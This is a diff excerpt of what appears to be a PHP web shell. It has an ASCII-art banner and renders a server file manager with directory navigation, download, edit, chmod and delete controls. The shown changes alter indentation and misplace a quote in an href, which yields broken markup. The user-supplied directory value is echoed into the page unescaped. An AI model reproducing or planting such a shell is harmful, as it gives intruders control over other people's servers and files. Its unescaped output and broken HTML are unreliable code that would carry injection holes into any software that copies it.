@@ -1,8 +1,8 @@
 <?php
 /*
 
-Izquierdo Vera, Javier
-javierizquierdovera@gmail.com
+  Izquierdo Vera, Javier
+  javierizquierdovera@gmail.com
   ________________________________________________________________________________________________
  /_______________________________________________________________________________________________/|
 |   ____             _____________      _        ____         ____            __________        | |
@@ -643,7 +643,7 @@ $homedir=getcwd();
         <font color="#D2D200" face="Tahoma" size="2">
         <span style="text-decoration: none">
         <font color="#000000">
-        <a href="?dir=<?
+        <a href="?dir="<?
   echo getcwd();    
       echo '"><td style="border: 0px dotted #FFCC66" align="center"><form action="" method="GET">&nbsp;Go to: </b><input type="text" name="dir" size="80"  style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"  value='.$dir.'><input type="submit"  style="color: #FF0000; font-weight: bold; border: 1px dashed #333333; background-color: #000000"  value="Send"></form><br>';
       echo "<div align='center'><table border='0'  style='color: #848484; font-weight: bold; border: 1px dashed #333333; background-color: #000000' id='table1' style='border: 1px #333333' height='90' cellspacing='0' cellpadding='0'><tr><td width='330' height='30' align='left'><b><font size='2'>Nombre:</font></b></td><td height='28' width='132' align='left'><font color='#A9D0F5' size='2'><b>Size:</b></font></td><td height='28' width='133' align='left'><font color='#008000' size='2'><b>Download:</b></font></td><td height='28' width='126' align='left'><font color='#FF9933' size='2'><b>Edit:</b></font></td>  <td height='28' width='135' align='left'><font color='#999999' size='2'><b>Perms:</b></font></td><td height='28' width='135' align='left'><font color='#999999' size='2'><b>Chmod:</b></font></td><td height='28' width='135' align='left'><font color='#FF0000' size='2'><b>Delete:</b></font></td></tr>";
